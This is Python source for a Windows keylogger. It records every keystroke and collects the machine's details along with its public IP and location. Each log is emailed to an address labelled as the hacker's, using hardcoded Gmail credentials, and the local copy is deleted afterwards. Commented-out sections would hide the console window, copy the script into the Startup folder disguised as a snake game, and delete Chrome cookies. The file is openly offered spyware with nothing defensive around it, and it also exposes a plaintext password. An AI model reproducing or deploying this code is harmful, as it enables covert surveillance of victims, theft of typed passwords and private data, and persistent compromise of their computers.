from pynput import keyboard
from datetime import date
import threading
import sys
import shutil
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import time
import wmi
import requests
import json


keys = []
count = 0
file_name = 'log.txt'
user_name = os.getlogin()

# The mail addresses and password
SENDER = "ippulicathome@gmail.com"
SENDER_PASSWORD = "Ippublic123"
RECEIVER =  'prodesaxy@gmail.com' #Gmail of haker
MAIL_CONTENT = '''
Hey hacker i give this for you.
'''

def sendLog(file):
	#Get Date Time
	current_date = date.today()

	#Setup the MIME 
	message = MIMEMultipart()
	message['From'] = SENDER
	message['To'] = SENDER_PASSWORD
	message['Subject'] = 'Log Key ' + str(current_date)

	#The body and the attachments for the mail
	message.attach(MIMEText(MAIL_CONTENT, 'plain'))
	attach_file_name = file
	attach_file = open(attach_file_name, 'rb') # Open the file as binary mode
	payload = MIMEBase('application', 'octate-stream')
	payload.set_payload((attach_file).read())
	encoders.encode_base64(payload) #encode the attachment
	#add payload header with filename
	payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
	message.attach(payload)

	#Create SMTP session for sending the mail
	session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
	session.starttls() #enable security
	session.login(SENDER, SENDER_PASSWORD) #login with mail_id and password
	text = message.as_string()
	session.sendmail(SENDER, RECEIVER, text)
	session.quit()
	time.sleep(2)
	os.remove(file)
# kiểm tra file có tồn tại ko

def get(data): 
    #data ='ip'
    endpoint = 'https://ipinfo.io/json'
    response = requests.get(endpoint, verify = True)

    if response.status_code != 200:
        return 'Status:', response.status_code, 'Problem with the request. Exiting.'
        exit()

    result = response.json()

    return result[data]

def get_info(): 
	with open (file_name, 'w',  encoding="utf-8") as file:
		c = wmi.WMI()
		my_system = c.Win32_ComputerSystem()[0]

		sys_manufacturer = my_system.Manufacturer
		sys_model = my_system.Model
		sys_name = my_system.Name
		sys_processors = my_system.NumberOfProcessors
		sys_type = my_system.SystemType
		data = "Manufacturer: " + str(sys_manufacturer) + "\n" #Get Manufacturer
		data += "Model: " + str(sys_model) + "\n" #Get Model
		data += "Name: " + str(sys_name) + "\n" #Get Name
		data += "Processors: " + str(sys_processors) + "\n" #Get Processors
		data += "Type: " + str(sys_type) + "\n" #Get Type
		data += "User: " + str(user_name) + "\n" #Get User
		data += "Ip: " + str(get('ip')) + "\n" #Get Ip
		data += "Hostname: " + str(get('hostname')) + "\n" #Get Hostname
		data += "City: " + str(get('city')) + "\n" #Get City
		data += "Region: " + str(get('region')) + "\n" #Get Region
		data += "Country: " + str(get('country')) + "\n" #Get Country
		data += "Loc: " + str(get('loc')) + "\n" #Get Loc
		data += "Org: " + str(get('org')) + "\n" #Get Org
		data += "Timezone: " + str(get('timezone')) + "\n" #Get Timezone
		file.write(str(data))

def checkFile(file): 
	file_path = os.getcwd() + '\\' + file
	file_size = os.path.getsize(file)
	if os.path.exists(file_path): # check file if exists and send log file
		sendLog(file) # Send log file
	else: # If not will exit
		return False
		sys.exit(1)

def on_press(key):
	global keys
	global count

	keys.append(key)
	count += 1

	try:
		print('Pressed {0}'.format(key.char))
	except AttributeError:
		print('Special key {0} pressed'.format(key))
	if key == "Key.enter":
		key = "\n"
	if key == "Key.space":
		key = " "
	if key == "Key.home":
		raise SystemExit(0)	
	if (count == 500) & (len(keys) == 500):
		with open (file_name, 'a') as file:
			for key in keys:
				k = str(key).replace("'", " ")
				file.write(str(k))
				
		count = 0 
		keys = []
		checkFile(file_name) # Input keys into file log
			
def on_release(key):
	print('{0} release'.format(key))
	
	if key == "Key.home":
		#Stop listener
		raise SystemExit(0)

def log():
	with keyboard.Listener(
		on_press=on_press,
		on_release=on_release) as listener:
			listener.join()

def main():

	# # hide console 
#	hide_program = win32gui.GetForegroundWindow()
#	win32gui.ShowWindow(hide_program, win32con.SW_HIDE)

	# # Move file to start up folder 
#	current_file = os.getcwd()
#	shutil.move(current_file + '\\' + 'Snake_game.py', 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
	
	# Clear Chrome Cookie :>>

#	path = "C:\\Users\\" + user_name + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
#	os.system("taskkill /im chrome.exe /f")
#	os.chdir(path)
#	time.sleep(2)
#	os.remove("Cookies")

	# Input information, IP public and localtion
	get_info()

	#Run Code Section
	try:
		thrLog = threading.Thread(target=log,)
		thrLog.start()
		thrLog.join()
	except:
		sys.exit(1)

if __name__ == '__main__':
	main()